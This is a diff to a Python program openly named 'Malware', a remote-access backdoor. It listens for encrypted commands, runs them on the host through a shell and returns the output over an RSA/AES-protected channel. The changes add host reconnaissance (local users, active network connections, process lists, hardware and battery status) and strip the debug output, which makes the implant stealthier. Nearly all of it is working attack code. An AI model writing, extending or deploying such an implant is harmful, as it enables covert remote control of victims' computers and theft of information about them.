@@ -28,14 +28,14 @@ private_key = None
 class AESCipher(object):
     """
     AES module by mnothic (https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)
-    Modified to use pad & unpad functions in Cryptodome
+    Modified to use CFB AES encryption as CBC wasn't working on Linux (in the case of big responses from target)
     """
     def __init__(self, key):
         self.bs = 32
         self.key = hashlib.sha256(key.encode()).digest()
 
     def encrypt(self, raw):
-        raw = self.pad(raw, self.bs)
+        raw = self.pad(raw)
         iv = Random.new().read(AES.block_size)
         cipher = AES.new(self.key, AES.MODE_CFB, iv)
         return base64.b64encode(iv + cipher.encrypt(raw))
@@ -44,14 +44,14 @@ class AESCipher(object):
         enc = base64.b64decode(enc)
         iv = enc[:AES.block_size]
         cipher = AES.new(self.key, AES.MODE_CFB, iv)
-        return self.unpad(cipher.decrypt(enc[AES.block_size:]), self.bs).decode('utf-8')
+        return self.unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
 
-    def pad(self, mess, bs):
+    def pad(self, mess):
         length = 16 - (len(mess) % 16)
         mess += bytes([length]) * length
         return mess
 
-    def unpad(self, mess, bs):
+    def unpad(self, mess):
         return mess[:-mess[-1]]
 
 
@@ -63,7 +63,7 @@ class Commands:
         self.msg = command
 
     def get_info(self):
-        known_comm = ['sysinfo', 'ip', 'platform', 'pid', 'resources']
+        known_comm = ['sysinfo', 'ip', 'platform', 'pid', 'resources', 'users', 'connections']
         if self.msg[5:] == 'sysinfo':
             return ' '.join(self.system())
         elif self.msg[5:] == 'ip':
@@ -72,8 +72,12 @@ class Commands:
             return self.platform()
         elif self.msg[5:] == 'pid':
             return self.pid()
+        elif self.msg[5:] == 'users':
+            return self.users()
         elif self.msg[5:] == 'resources':
             return self.resources()
+        elif self.msg[5:] == 'connections':
+            return self.connections()
         else:
             return 'List of available information gathering commands : info + [{}]'.format(' '.join(known_comm))
 
@@ -90,23 +94,57 @@ class Commands:
         return platform.platform().replace('-', ' ')
 
     def pid(self):
-        return 'Process ID : {}\n{}'.format(os.getpid(), psutil.test())
+        proc_list = []
+        for proc in psutil.process_iter(attrs=['pid', 'name']):
+            proc_list.append(str(proc.pid) + '\t' + proc.name() + '\n')
+        return 'Process ID : {}\nList of active processes :\nPID\tNAME\n{}'.format(os.getpid(), ''.join(proc_list))
+
+    def users(self):
+        userlist = []
+        for item in psutil.users():
+            userlist.append(item.name)
+        return 'Available local users :\n' + '\n'.join(userlist)
+
+    def connections(self):
+        conn_list = []
+        for connections in psutil.net_connections():
+            if connections.raddr:
+                conn_list.append('-> FROM {}:{} TO {}:{} STATUS : {}'.format(connections.laddr[0], connections.laddr[1],
+                                                                             connections.raddr[0], connections.raddr[1],
+                                                                             connections.status))
+            else:
+                conn_list.append('-> FROM {}:{} STATUS : {}'.format(connections.laddr[0], connections.laddr[1],
+                                                                    connections.status))
+        return 'Active connections :\n' + '\n'.join(conn_list)
 
     def resources(self):
-        ram = '\nRAM used : {}%\n'.format(psutil.virtual_memory().percent)
+        # Retrieving CPU usage data
+        cpu = 'Processor has {} cores ({} threads). Current frequency at {}(out of {})\n'.format(
+            psutil.cpu_count(logical=False), psutil.cpu_count(), psutil.cpu_freq().current, psutil.cpu_freq().max)
+        # Retrieving RAM usage data
+        ram = 'RAM used : {}% ({} out of {}\n'.format(psutil.virtual_memory().percent, psutil.virtual_memory().used,
+                                                      psutil.virtual_memory().total)
+        # Retrieving Disk usage data
         diskarray = []
         for disks in psutil.disk_partitions():
             temp = []
             for i in range(len(disks)):
                 temp.append(disks._fields[i] + ':')
-                temp.append(disks[i] + '  ')
+                temp.append(disks[i] + '\t')
             diskarray.append(temp)
-            array = ''
+        array = ''
         for disks in diskarray:
             array += '\t' + ' '.join(disks) + '\n'
         disks = 'Disks : \n{}'.format(array)
-
-        return ram + disks
+        # Retrieving battery usage data
+        if psutil.sensors_battery():
+            battery = 'Battery at {}% : {} seconds left. Power-plugged : {}'.format(
+                psutil.sensors_battery().percent,
+                psutil.sensors_battery().secsleft,
+                psutil.sensors_battery().power_plugged)
+        else:
+            battery = 'Device has no batteries'
+        return 'System scan :\n' + cpu + ram + disks + battery
 
 
 class InThread(threading.Thread):
@@ -128,7 +166,6 @@ class InThread(threading.Thread):
         try:
             self.socket.bind(('', self.in_port))
             self.socket.listen(5)
-            print('listening for incoming traffic')
             self.start()
         except socket.timeout:
             self.listen()
@@ -166,33 +203,25 @@ class InThread(threading.Thread):
                                 resp = subprocess.check_output(command, shell=True)
                                 cons.send(resp.decode('UTF-8'))
                         except subprocess.CalledProcessError:
-                            cons.send("Impossible d'exécuter cette commande")
+                            cons.send('Unable to execute this command')
             elif msg[:4] == 'info':
                 x = Commands(msg)
                 cons.send(str(x.get_info()))
         cons.stop()
         time.sleep(2)
-        #self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
-        print('closed IN')
-        print('Closed socket coming from {}'.format(in_ip))
 
     def init_public_key(self, conn):
         try:
             remote_public_key_pem = conn.recv(1024)
             global remote_public_key
             remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
-            print("Remote public key successfully loaded")
         except socket.timeout:
             self.init_public_key(conn)
-        except ValueError:
-            print("Invalid Public Key received")
 
-    # Used to be called decrypt
-    def rsa_decrypt(self,ciphertext):
+    def rsa_decrypt(self, ciphertext):
         global private_key
-        return private_key.decrypt(ciphertext,
-                                padding.OAEP(
+        return private_key.decrypt(ciphertext, padding.OAEP(
                                     mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                     algorithm=hashes.SHA256(),
                                     label=None))
@@ -213,36 +242,31 @@ class OutThread(threading.Thread):
             self.sock = socket.socket()
             self.sock.connect((self.ip[0], self.out_port))
         except ConnectionError:
-            print('Unable to connect to {}'.format(self.ip))
+            self.stop()
 
         self.send_public_keys()
 
     def send(self, message):
         try:
             print('sending', message)
-            #self.sock.sendall(self.rsa_encrypt(message.encode('UTF-8')))
             self.sock.sendall(self.aes.encrypt(message.encode('UTF-8')))
         except ConnectionError:
-            print('Unable to send <<{}>> to {}'.format(message, self.ip))
+            self.stop()
 
     def stop(self):
-        self.sock.shutdown(socket.SHUT_RDWR)
         self.sock.close()
-        print('closed OUT')
 
     def send_public_keys(self):
         try:
             global public_key_pem
             self.sock.sendall(public_key_pem)
         except ConnectionError:
-            print("Unable to connect to {}:{}".format(self.destination[0], self.destination[1]))
             self.send_public_keys()
 
     # Method used to be called encrypt
     def rsa_encrypt(self, message):
         global remote_public_key
-        return remote_public_key.encrypt(message,
-                                         padding.OAEP(
+        return remote_public_key.encrypt(message, padding.OAEP(
                                              mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                              algorithm=hashes.SHA256(),
                                              label=None))
@@ -263,13 +287,10 @@ class Malware(threading.Thread):
 
         self.prod = InThread()
         self.start()
-        print('started Malware')
 
     def run(self):
         if self.prod.is_alive():
-            print('waiting for IN to stop')
             self.prod.join()
-            print('IN joined MAIN')
 
     def stop(self):
         self.prod.stop()
